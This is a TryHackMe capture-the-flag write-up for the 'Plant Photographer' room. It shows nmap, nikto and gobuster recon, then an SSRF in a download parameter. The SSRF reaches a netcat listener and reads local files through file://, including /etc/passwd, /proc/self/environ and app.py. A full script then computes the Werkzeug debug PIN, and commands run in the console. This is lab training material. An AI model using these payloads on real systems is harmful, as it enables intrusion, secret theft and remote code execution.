<h1 align="center"><a href="https://tryhackme.com/room/plantphotographer">Plant Photographer</a></h1>
<p align="center"><img width="595px" src="https://github.com/user-attachments/assets/3b292a54-766f-48e0-a066-9748c40a077f"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://githubhttps://github.com/user-attachments/assets/f9d56f26-bf87-4309-b5d8-f98cbb0302b0com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20APR%2016-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>

<h2>Task 1 • Plant Photographer</h2>
<h3>Set uo your environment</h3>
<p>To successfully complete this room, you'll need to set up your virtual environment. This involves starting both your AttackBox (if you're not using your VPN) and Target Machines, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.</p>

<p>Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos:<br>

<code>http://MACHINE_IP/</code><br>

Proud of building the site himself from scratch, he’s asked you to take a quick look and let him know if anything could be improved. Look closely at how the site works under the hood, and determine whether it was coded with best practices in mind. If you find anything questionable, dig deeper and try to uncover the flag hidden behind the scenes.</p>

<p><em>Answer the questions below</em></p>

<br>
<h2>Initial Reconnaissance</h2>
<p>

- Earth<br>
- Phone: +00 123456<br>
- Email: jay@thm.thm</p>

<img width="1194" height="773" alt="image" src="https://github.com/user-attachments/assets/311a0730-b337-4490-a231-882fe4023b34" />

<br>
<h2>Static Host Mapping</h2>

```bash
MachineIP thm.thm
```

<h2>Port Scanning<a id='1'></a></h2>

<div><p>

| **Port**           | **Service**          | **Version**                          |
|-------------------:|:---------------------|:-------------------------------------|
| `22`               |`SSH`                 |OpenSSH 9.6p1 Ubuntu 3ubuntu13.14     |
| `80`               |`HTTP`                |Werkzeug httpd 0.16.0 (Python 3.10.7) |

</p></div>


```bash
:~/plant# nmap -sC -sV -Pn -n -p- -T4 thm.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-31 22:17 BST
Nmap scan report for thm.thm (MachineIP)
Host is up (0.00025s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.10.7)
|_http-title: Jay Green
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds
```

<img width="1119" height="215" alt="image" src="https://github.com/user-attachments/assets/bfadcbbf-edd9-4717-bc78-8474bc5d0918" />

<br>
<h2>Vulnerability Scanning</h2>
<p>

- /content</p>

```bash
:~/plant# nikto -h http://thm.thm
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          MachineIP
+ Target Hostname:    thm.thm
+ Target Port:        80
+ Start Time:         2026-03-31 22:19:05 (GMT1)
---------------------------------------------------------------------------
+ Server: Werkzeug/0.16.0 Python/3.10.7
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, OPTIONS, HEAD 
+ OSVDB-3092: /console: This might be interesting...
+ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2026-03-31 22:19:25 (GMT1) (20 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<img width="1298" height="541" alt="image" src="https://github.com/user-attachments/assets/32afdf07-5483-4725-9229-979b9aef7846" />

<br>
<h2>Directory & File Enumeration</h2>

```bash
:~/plant# gobuster dir -u http://thm.thm -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://thm.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 48]
/console              (Status: 200) [Size: 1985]
/download             (Status: 200) [Size: 20]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

<h2>Web Discovery</h2>

<img width="1221" height="353" alt="image" src="https://github.com/user-attachments/assets/157b73f1-7d9a-4573-99d1-2b205df4a21e" />

<br>
<br>

<img width="1214" height="347" alt="image" src="https://github.com/user-attachments/assets/1990f069-6ffd-48b8-abd6-2eeea4c059b7" />

<br>
<br>

<img width="1221" height="92" alt="image" src="https://github.com/user-attachments/assets/69610acd-d8d2-44d3-8a4d-05fc2d9ba0ae" />

<br>
<br>

<img width="1227" height="104" alt="image" src="https://github.com/user-attachments/assets/f331ee28-3d29-4a25-9305-94c7e8ba9577" />

<br>
<br>

<img width="1118" height="338" alt="image" src="https://github.com/user-attachments/assets/f9b91194-6497-4129-b59e-fbbcdc893153" />

<br>
<p>

- Inspect<br>
- Click <strong>Download Resume</strong><br>
- Identify <code>http://MachineIP/download?server=secure-file-storage.com:8087&id=********</code></p>

<img width="1299" height="489" alt="image" src="https://github.com/user-attachments/assets/ee821748-ce6f-4e57-805d-e4088f8c31c0" />

<br>
<p>

- or using BurpSuite</p>

<img width="1251" height="669" alt="image" src="https://github.com/user-attachments/assets/0d38021a-ace5-4bdf-977b-ccc0cf275db2" />

<br>
<p>

- Set up a listener.</p>

```bash
:~/plant# nc -nlvp 6666
Listening on 0.0.0.0 6666
```

<p>

- Navigate to http://thm.thm/download?server=YourIP:6666&id=******** <code>[A]</code>.<br>
- Identify /public-docs-k057230990384293/********.pdf</p>

<img width="1290" height="415" alt="image" src="https://github.com/user-attachments/assets/d846f173-2f07-4b67-8738-239db1797229" />

<br>
<p>

- or using BurpSuite</p>

<img width="1262" height="759" alt="image" src="https://github.com/user-attachments/assets/c87bc5a8-d02a-44f7-ae67-4dd551231ab5" />

<br>
<br>

<img width="1258" height="176" alt="image" src="https://github.com/user-attachments/assets/660321c4-b497-4435-9627-6f4c8fd00807" />

<br>
<br>
<p>

- Click <code>most recent call last</code> in http://thm.thm/download?server=YourIP:6666&id=********.<br>
- Discover clues about the web application.</p>

<img width="1342" height="626" alt="image" src="https://github.com/user-attachments/assets/8d7da266-604b-4f79-85be-8378525748db" />

<br>
<p>

- Navigate to <code>[A]</code> substituting the key by anything.<br>
- Discover about the <code>download</code> mechanism = URL + server + /public-docs-k057230990384293 + filename.</p>

<img width="1250" height="607" alt="image" src="https://github.com/user-attachments/assets/5f4019e4-a7df-43ee-b4f9-1718df190b11" />

<br>

```bash
:~# curl -s "http://thm.thm/download?server=file:///usr/src/app/app.py%23&id=********"
```

<img width="1111" height="690" alt="image" src="https://github.com/user-attachments/assets/b90b0a9e-2b7a-4df6-b0a3-e9afc41afa17" />

<br>
<br>
<p>

- or using Burp Suite</p>

<img width="1741" height="739" alt="image" src="https://github.com/user-attachments/assets/6a5b2b20-26ae-4cb2-9cd6-dc7911b1de54" />

<br>
<br>

<img width="1745" height="214" alt="image" src="https://github.com/user-attachments/assets/54fa3652-9174-41ca-bf28-eaf531e71d7d" />


<br>
<p>
  
- Navigate to http://thm.thm/download?server=secure-file-storage.com:8087/admin%23&id=1 to uncover the second flag.</p>

<img width="1496" height="748" alt="image" src="https://github.com/user-attachments/assets/a8dfcd02-16f6-4ba4-9de9-0f654a1984c8" />


<p>

- Use Burp to read <code>/proc/self/environ</code></p>

<img width="1745" height="220" alt="image" src="https://github.com/user-attachments/assets/8c7a0b2d-8c9e-4bf8-90d5-7fcb005707e5" />

<br>
<p>

- Use Burp to read <code>/etc/passwd</code></p>

<img width="1742" height="455" alt="image" src="https://github.com/user-attachments/assets/0a5143bd-c56b-4e32-a6ad-22ab3731a42a" />

<br>
<p>

- Use Burp to read <code>/sys/class/net/eth0/address</code>.<br>
- Identify <code>02:42:ac:14:00:02.</code><br>- MAC Address: 02:42:ac:14:00:02<br>- Hexadecimal String: 0x0242ac140002<br>- Decimal Value: 2485378088962</p>


```bash
:~# curl -s "http://thm.thm/download?server=file:///sys/class/net/eth0/address%23&id=********"
02:42:ac:14:00:02
```

<img width="1116" height="79" alt="image" src="https://github.com/user-attachments/assets/9cd3790e-4fdd-47a2-bf16-c9bef302652a" />

<br>
<br>

<img width="1739" height="156" alt="image" src="https://github.com/user-attachments/assets/b2430571-93aa-42d2-92ae-c9f854f1fe9e" />

<p>

- Use Burp to read <code>/proc/self/cgroup</code>.<br>
- Identify <code>7...</code>.</p>

<img width="1743" height="311" alt="image" src="https://github.com/user-attachments/assets/107c87ef-c19b-45c0-8d93-ec4e87d8a2d2" />

<br>
<p>

- Use Burp to read <code>/proc/net/arp</code><br>IP address       HW type     Flags       HW address            Mask     Device<br>172.20.0.1       0x1         0x2         02:42:14:c7:50:3d     *        eth0</p>

<img width="1745" height="188" alt="image" src="https://github.com/user-attachments/assets/cdef8ab4-996e-49fa-a04f-cffd7af5ee73" />

<br>
<p>
  
- Learned the following script with <a href="https://jaxafed.github.io/posts/tryhackme-plant_photographer/">jaxafed</a>.</p>

```bash
:~/PlantPhotograher# nano exploit.py
```

```bash
import hashlib
from itertools import chain
probably_public_bits = [
    'root',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '2485378088962',
    '7...'
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

```bash
:~/PlantPhotograher# python3 exploit.py
***-***-***
```

<br>
<p>

- Navigate to http://thm.thm/console.</p>

<img width="1497" height="419" alt="image" src="https://github.com/user-attachments/assets/c835dd05-4789-4613-b110-03f207d23b5f" />

<p>

- Input the PIN generated by the Python script.<br>
- Click <strong>Submit PIN</strong></p>

<img width="1494" height="289" alt="image" src="https://github.com/user-attachments/assets/2d058537-bbf7-4bfe-9242-cfb9554c2488" />

<br>

<img width="1417" height="99" alt="image" src="https://github.com/user-attachments/assets/245ea519-5635-4e25-9b59-5d9629597f2a" />

```bash
[console ready]
>>> import os
>>> os.getcwd()
'/usr/src/app'
>>> os.popen('ls').read()
'Dockerfile\napp.py\nflag-****************.txt\nprivate-docs\npublic-docs\nrequirements.txt\nstatic\ntemplates\n'  
>>> print(os.popen('cat flag-****************.txt').read())
THM{•••••••_•_••••_•_••}
```

<img width="1503" height="405" alt="image" src="https://github.com/user-attachments/assets/31a5c92e-8a0e-4cf0-8c1e-7c302d5427d7" />

<br>
<p>1.1. What API key is used to retrieve files from the secure storage service?<br>
<code>THM{•••••••••••••••••••••••}</code></p>

<p>1.2. What is the flag in the admin section of the website?<br>
<code>thm{••••••••••••••••••••} </code></p>

<p>1.3. What flag is stored in a text file in the server's web directory?<br>
<code>THM{•••••••_•_••••_•_••}</code></p>

<h2 align="center">Challenge Completed</h2>
<p align="center">                                                       <img width="700px" src="https://github.com/user-attachments/assets/5d0fe3ce-e041-420b-83a2-12af356125e8"><br>
                                                                         <img width="700px" src="https://github.com/user-attachments/assets/d609153c-9027-4ae8-88fe-297b8beb0d6d"><br>
                                                                         <img width="700px" src="https://github.com/user-attachments/assets/79999ff3-99de-4e84-ac92-d5dcdd9b2421"></p>

<h2 align="center">My TryHackMe Journey &nbsp; · &nbsp; 2026, April</h2>
<div align="center"><h6>

|Day<br><br><br> |Capability<br>Score<br><br>|Room<br>Name<br><br>|Level<br><br><br>|Type<br><br><br>|Rooms<br>Completed<br><br>|Points<br><br><br>|Badges<br><br><br>|Global<br>All<br>Time<br>|Global<br>Monthly<br><br>|Brazil<br>All<br>Time<br>|Brazil<br>Monthly<br><br>|
|---------------:|-----------------:|:----------------|:---------------|:----------------------------------------:|-------------------------:|-----------------:|-----------------:|--------------------:|------------------------:|--------------------:|---------------:|
|16<br><br>      |109<br><br>       |Plant Photographer<br><br>             |Easy<br><br>   |🔗<br><br>| 1,168<br><br>| 165,373<br><br>| 92<br><br>| 15ᵗʰ<br><br>| 3ʳᵈ<br><br>| 2ⁿᵈ<br><br>| 17ᵗʰ<br><br>|
|16<br><br><br>      |109<br><br><br>       |Introduction to the World of OT/ICS<br>|Easy<br><br><br>   |🔗<br><br><br>| 1,166<br><br><br>| 165,343<br><br><br>| 92<br><br><br>| 15ᵗʰ<br><br><br>| -<br><br><br>| 2ⁿᵈ<br><br><br>| 12ⁿᵈ<br><br><br>|
|15<br><br>      |109<br><br>       |Prompt Engineering<br>              |Easy<br><br>   |🔗<br><br>| 1,165<br><br>| 165,209<br><br>| 92<br><br>| 14ᵗʰ<br><br>| 3ʳᵈ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|
|15<br><br>      |109<br><br>       |AI Models & Data<br>                |Medium<br><br> |🔗<br><br>| 1,164<br><br>| 165,081<br><br>| 92<br><br>| 14ᵗʰ<br><br>| 3ʳᵈ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|
|15<br><br>      |109<br><br>       |AI Security Path Ticketing Event<br>|<br><br>       |ℹ️<br><br>| 1,163<br><br>| 164,993<br><br>| 92<br><br>| 14ᵗʰ<br><br>| 3ʳᵈ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|

</h6></div><br>

<p align="center">Capability Score &nbsp;&nbsp; <strong>109</strong> <br><img width="1000px" src="https://github.com/user-attachments/assets/e8b771f2-965e-4007-9425-6294d4478c7d"><br>
                  Stats                                              <br><img width="300px"  src="https://github.com/user-attachments/assets/f5975948-ba8a-44ee-8aca-f719bc943426"><br>
                  Global All Time &nbsp;&nbsp; 15ᵗʰ                  <br><img width="1000px" src="https://github.com/user-attachments/assets/47318d1a-437e-42c1-a6b9-8c6e687ff45e"><br>
                  Global Monthly &nbsp;&nbsp;      -                 <br><img width="1000px" src="https://github.com/user-attachments/assets/704fe060-7987-4c9e-bad5-4994c493707d"><br>
                  Brazil All Time &nbsp;&nbsp;  2ⁿᵈ                  <br><img width="1000px" src="https://github.com/user-attachments/assets/3b927210-0906-429c-bb15-e79919772469"><br>
                  Brazil Monthly &nbsp;&nbsp;  17ᵗʰ                  <br><img width="1000px" src="https://github.com/user-attachments/assets/f9e48c51-47e5-4de2-a994-465f0ad1dba0"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
